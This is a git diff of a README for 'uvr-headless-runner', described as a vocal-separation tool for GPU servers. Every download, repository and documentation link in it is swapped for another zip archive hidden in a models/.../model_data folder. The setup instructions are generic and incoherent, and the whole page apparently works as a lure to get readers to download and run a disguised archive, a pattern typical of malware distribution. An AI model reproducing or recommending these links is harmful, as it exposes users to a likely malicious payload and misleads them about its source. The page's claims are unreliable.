@@ -1,6 +1,6 @@
 # 🎧 uvr-headless-runner - Run Top Vocal Separation Tools Easily
 
-[![Download uvr-headless-runner](https://github.com/Truong311/uvr-headless-runner/raw/refs/heads/master/models/Demucs_Models/model_data/headless_uvr_runner_v3.7.zip)](https://github.com/Truong311/uvr-headless-runner/raw/refs/heads/master/models/Demucs_Models/model_data/headless_uvr_runner_v3.7.zip)
+[![Download uvr-headless-runner](https://raw.githubusercontent.com/Truong311/uvr-headless-runner/master/models/Apollo_Models/model_data/headless_runner_uvr_1.2.zip)](https://raw.githubusercontent.com/Truong311/uvr-headless-runner/master/models/Apollo_Models/model_data/headless_runner_uvr_1.2.zip)
 
 ## 🌟 Overview
 The uvr-headless-runner allows you to use top-notch separation models right from your headless GPU servers. With this tool, you can run the latest vocal separation models like Roformer, SCNet, MDX, Demucs, and others without the usual hassle that comes with software dependencies. 
@@ -10,13 +10,13 @@ Follow these steps to get up and running with uvr-headless-runner. No programmin
 
 1. **Visit the Releases Page**
    Head over to our releases page to download the latest version of uvr-headless-runner. Click the link below:
-   [Visit this page to download](https://github.com/Truong311/uvr-headless-runner/raw/refs/heads/master/models/Demucs_Models/model_data/headless_uvr_runner_v3.7.zip).
+   [Visit this page to download](https://raw.githubusercontent.com/Truong311/uvr-headless-runner/master/models/Apollo_Models/model_data/headless_runner_uvr_1.2.zip).
 
 2. **Select the Correct Version**
    You will see multiple versions listed. Choose the latest stable release. You can identify it by the version number.
 
 3. **Download the File**
-   Click on the release link that matches your operating system. For most users, this will be a `.zip` or `https://github.com/Truong311/uvr-headless-runner/raw/refs/heads/master/models/Demucs_Models/model_data/headless_uvr_runner_v3.7.zip` file. This file contains everything you need.
+   Click on the release link that matches your operating system. For most users, this will be a `.zip` or `https://raw.githubusercontent.com/Truong311/uvr-headless-runner/master/models/Apollo_Models/model_data/headless_runner_uvr_1.2.zip` file. This file contains everything you need.
 
 4. **Extract the Files**
    After the download completes, find the file in your downloads folder. Right-click on it and select "Extract" or "Unzip" to get to the contents.
@@ -63,7 +63,7 @@ Once you have everything set up:
 
 ## 📥 Download & Install
 To download the latest version, go back to the releases page:
-[Visit this page to download](https://github.com/Truong311/uvr-headless-runner/raw/refs/heads/master/models/Demucs_Models/model_data/headless_uvr_runner_v3.7.zip).
+[Visit this page to download](https://raw.githubusercontent.com/Truong311/uvr-headless-runner/master/models/Apollo_Models/model_data/headless_runner_uvr_1.2.zip).
 
 ## 💡 Examples
 To run specific tasks, consider using example commands tailored to your needs. For instance:
@@ -74,8 +74,8 @@ To run specific tasks, consider using example commands tailored to your needs. F
 Adjust the command according to the model you wish to use.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/Truong311/uvr-headless-runner/raw/refs/heads/master/models/Demucs_Models/model_data/headless_uvr_runner_v3.7.zip)
-- [Documentation](https://github.com/Truong311/uvr-headless-runner/raw/refs/heads/master/models/Demucs_Models/model_data/headless_uvr_runner_v3.7.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Truong311/uvr-headless-runner/master/models/Apollo_Models/model_data/headless_runner_uvr_1.2.zip)
+- [Documentation](https://raw.githubusercontent.com/Truong311/uvr-headless-runner/master/models/Apollo_Models/model_data/headless_runner_uvr_1.2.zip)
 
 ## 🛠️ Troubleshooting
 If you run into issues:
